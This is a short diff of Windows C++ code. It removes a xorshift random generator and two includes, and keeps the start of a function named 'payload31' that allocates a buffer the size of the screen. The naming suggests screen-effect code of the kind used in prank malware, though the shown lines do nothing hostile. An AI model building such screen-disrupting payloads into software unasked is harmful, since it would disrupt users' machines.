@@ -1,16 +1,5 @@
 #include <windows.h>
-#include <intrin.h>
-#include <cmath>
-DWORD xs;
-VOID SeedXorshift32(DWORD dwSeed) {
-xs = dwSeed;
-}
-DWORD xorshift32() {
-	xs ^= xs << 13;
-	xs ^= xs << 17;
-	xs ^= xs << 5;
-	return xs;
-}
+
 DWORD WINAPI payload31(LPVOID lpParam) {
 	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
 	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
